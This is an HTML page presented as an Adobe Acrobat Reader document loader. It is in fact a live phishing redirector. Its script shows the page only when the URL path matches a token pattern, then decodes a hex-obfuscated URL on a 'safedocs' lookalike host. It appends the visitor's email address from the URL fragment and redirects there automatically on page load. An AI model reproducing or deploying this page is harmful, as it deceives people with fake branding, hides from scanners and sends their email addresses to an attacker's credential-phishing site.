<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loader</title>

<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #f5f5f5;
    font-family: Arial, sans-serif;
}

.container {
    text-align: center;
}

.logo {
    width: 140px;
    height: auto;
    margin-bottom: 25px;
}

.loader {
    position: relative;
    width: 80px;
    height: 80px;
    margin: 0 auto;
}

.loader div {
    transform-origin: 45px 45px;
    animation: fade 1.2s linear infinite;
}

.loader div:after {
    content: "";
    display: block;
    position: absolute;
    top: 6px;
    left: 41px;
    width: 8px;
    height: 20px;
    border-radius: 2px;
    background: #000;
}

.loader div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; }
.loader div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
.loader div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; }
.loader div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
.loader div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; }
.loader div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
.loader div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
.loader div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
.loader div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; }
.loader div:nth-child(10){ transform: rotate(270deg); animation-delay: -0.2s; }
.loader div:nth-child(11){ transform: rotate(300deg); animation-delay: -0.1s; }
.loader div:nth-child(12){ transform: rotate(330deg); animation-delay: 0s; }

@keyframes fade {
    0% { opacity: 1; }
    100% { opacity: 0.15; }
}

.hidden {
    display: none;
}
</style>
</head>

<body>

<div id="content" class="hidden">
    <div class="container">
        <img class="logo" src="https://static.vecteezy.com/system/resources/thumbnails/019/016/806/small_2x/adobe-acrobat-reader-icon-free-png.png" alt="Logo">
        <div class="loader">
            <div></div><div></div><div></div><div></div>
            <div></div><div></div><div></div><div></div>
            <div></div><div></div><div></div><div></div>
        </div>
    </div>
</div>

<script>
// SIMPLE DEBUG VERSION - Replace your current script with this
(function() {
    // Get the current URL path
    const path = window.location.pathname;
    
    // Log for debugging (remove after testing)
    console.log("Current URL path:", path);
    
    // Check if URL has the pattern with slashes
    // This accepts: /10UPPER/4lower/ANYTHING (39 chars mixed)
    const pattern = /\/[A-Z]{10}\/[a-z]{4}\/[A-Za-z0-9]{39}$/;
    
    if (pattern.test(path)) {
        console.log("Pattern matched! Showing content...");
        document.getElementById('content').classList.remove('hidden');
        
        // Your hex redirect (keep your long hex string)
        function hexToString(hex) {
            let str = '';
            for (let i = 0; i < hex.length; i += 2) {
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            return str;
        }
        
        const redirectHex = "68747470733a2f2f6e352d73616665646f63732e6d61726d696f72696f626963692e69742f51414d4d522f6b6173773f7369643d6e324c625370364e726d524c3165737669504c4d4535327a65786e69486f6b4d4c425a57704c527a415545554c4762665651514f4b574764784d696f2d4b785a76486145334f626668376a6b716e3430726e334a7138576966573039716431704561666534367379426573583967565261574b4e6c5130745323";
        const redirectUrl = hexToString(redirectHex);
        
        // Check for email in URL
        const fullUrl = window.location.href;
        if (fullUrl.includes('#')) {
            const email = fullUrl.split('#')[1];
            window.location.href = redirectUrl + email;
        } else {
            setTimeout(function() {
                window.location.href = redirectUrl;
            }, 1500);
        }
    } else {
        console.log("Pattern not matched. Current path should end with: /10UPPER/4lower/39chars");
    }
})();
</script>

</body>
</html>
